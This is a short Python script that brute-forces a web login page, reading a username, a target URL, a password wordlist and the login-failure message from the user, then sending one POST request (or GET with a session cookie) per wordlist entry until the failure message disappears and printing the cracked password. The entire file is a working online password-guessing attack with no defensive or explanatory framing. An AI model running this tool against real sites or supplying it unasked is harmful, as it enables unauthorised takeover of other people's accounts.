import requests #allows to automate the GET and POST request
from termcolor import *
import colorama
colorama.init()

#You will need Username and URL. Tries to brute fore the password using a wordlist
url = input("[+] Enter the page URL: ")
user_name = input("[+] Enter the username of the Account: ")
password_file = input("[+] Enter the password wordlist to use: ")
login_failed_str = input('[+] Enter error that occurs when Login failes: ')
cookie_value = input('[+] Enter cookie value(option): ') #Neded if burtforing a website indise a session

def bruteforcing(user_name,url):
	#loop through password wordlist
	for passwords in wordlist:
		password = passwords.strip()
		cprint('[+] Trying ' + password,'red')

		#The key of the data directory will be the name of the username/password filed in the html
		data = {'username':user_name,'password':password,'Login':'submit'}	

		#Check if cookie is present to make diffrent type of request
		if cookie_value != '':
			response = requests.get(url, params={'username':user_name,'password':password,'Login':'Login'}, cookies = {'Cookie': cookie_value})
		else:
			response = requests.post(url,data=data)


		#Checks if password is valid or not
		if login_failed_str in response.content.decode():
			pass
		else:
			cprint('[+] Found username: ==> '+ user_name,'green')
			cprint('[+] Found password: ==> '+ password,'green')
			exit()

with open(password_file, 'r') as wordlist:
	bruteforcing(user_name,url)


cprint('[+] Password not Hacked','black')

